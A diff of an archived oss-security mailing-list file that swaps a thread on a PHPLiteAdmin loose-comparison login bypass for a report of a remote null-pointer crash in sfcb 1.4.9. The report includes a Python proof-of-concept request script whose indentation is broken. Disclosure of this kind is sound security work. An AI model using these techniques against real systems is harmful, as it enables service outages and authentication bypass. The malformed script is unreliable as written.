@@ -1,53 +1,86 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/25/3
-Message-ID: <b38f682c-45db-111b-2741-27946d4fca6b@kkoenig.net>
-Date: Wed, 25 Apr 2018 10:57:55 +0200
-From: Karsten König <mail@...enig.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/31/3
+Message-ID: <722994b1.3f3f.1614cad02fb.Coremail.hxl1999@yeah.net>
+Date: Wed, 31 Jan 2018 22:44:22 +0800 (CST)
+From: XinleiHe <hxl1999@...h.net>
 To: oss-security@...ts.openwall.com
-Subject: Re: Authorization bypass in PHPLiteAdmin since 1.9.5
+Subject: report a vulnerability in sfcb software.
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Hi there,
 
-wbowling from GitHub found out that this bug is even more serious and
-can be used to bypass the authorization for arbitary passwords. The bug
-is in Line 40 of classes/Authorization.php[0]. The salt is generated
-with every reload. You can create cookies again and again until you have
-a salt which gives you a hash like '0e179250003459658275905707244744'.
-Now you can login with that specific salt and '0' as the cookie.
 
-Best,
+I am XinleiHe. I will report a vulnerability in sfcb software.
+SFCB is a CIM server for resource-constrained and embedded environments. It's offical website is sblim.sourceforge.net/wiki/index.php/Sfcb.
+ 
+A null pointer vulnerabilty exists in sfcb newest version(1.4.9),a remote attacher can send a crafted packet trigger to this vulnerabilty , and make sfcbd DOS.
+I want to apply a cve id for this vulnerabilty.
 
-Karsten
 
-[0]
-https://github.com/phpLiteAdmin/pla/blob/f3998704a846ddf71539092cd6fe84f2e9c35725/classes/Authorization.php#L40
 
-On 23.04.2018 06:41, Karsten König wrote:
-> Hello,
-> 
-> I found a small issue in PHPLiteAdmin. It's an authorization bypass
-> which works since version 1.9.5 from 2014 (current is 1.9.7.1) because
-> PLA uses '==' instead of '===' for the password comparison in
-> 'attemptGrant' of the 'Authorization' class. If the password is set to
-> one which correspondends to a number in scientific notation, one could
-> easier bruteforce the password or bypass it completely, e.g.:
-> 
-> php > var_dump('200' == '2e2');
-> bool(true)
-> php > var_dump('0' == '0e2');
-> bool(true)
-> php > var_dump('0' == '0e2342');
-> bool(true)
-> 
-> I opened an issue at GitHub for this[0] and have written about it[1]
-> (section 2 is the interesting one for this issue).
-> 
-> Best,
-> 
-> Karsten
-> 
-> [0] https://github.com/phpLiteAdmin/pla/issues/11
-> [1]
-> http://k3research.outerhaven.de/posts/small-mistakes-lead-to-big-problems.html
-> 
+
+You can use following python code to reproduce this vulnerability.
+--------------------------------------------------------------
+import httplib
+from xml.dom.minidom import Document
+class write_xml(Document):
+    def __init__(self):
+
+
+        Document.__init__(self)
+ 
+    def set_tag(self,tag):
+        self.tag = tag
+        self.cim = self.createElement(self.tag)
+        #self.setAttribute("encoding", "utf-8")
+        
+        self.cim.setAttribute("CIMVERSION", "2.0")
+        self.cim.setAttribute("DTDVERSION", "2.0")
+        self.appendChild(self.cim)
+
+
+        self.msg = self.createElement("MESSAGE")
+        self.msg.setAttribute("ID", "4711")
+        self.msg.setAttribute("PROTOCOLVERSION","1.0")
+        self.cim.appendChild(self.msg)
+
+
+        self.sim = self.createElement("SIMPLEREQ")
+        self.msg.appendChild(self.sim)
+
+
+        self.ime = self.createElement("IMETHODCALL")
+        self.ime.setAttribute("NAME","EnumerateInstances")
+        self.sim.appendChild(self.ime)
+
+
+        self.local = self.createElement("LOCALNAMESPACEPATH")
+        self.ime.appendChild(self.local)
+       
+        self.names1=self.createElement("NAMESPACE")
+        self.names1.setAttribute("NAME", "root")
+        self.local.appendChild(self.names1)
+
+
+    def display(self):
+        print self.toprettyxml(indent="   ")
+    def retdata(self):
+        return self.toprettyxml(indent="   ")
+
+
+def httpreq(data):
+conn = httplib.HTTPConnection("127.0.0.1", 5988, False)
+conn.request('POST', '/cimom',data)
+res = conn.getresponse() 
+
+
+def main():
+wx = write_xml()
+wx.set_tag('CIM')
+print wx.retdata()
+print httpreq(wx.retdata())
+
+
+if __name__=='__main__':
+main()
+-------------------------------------------------------
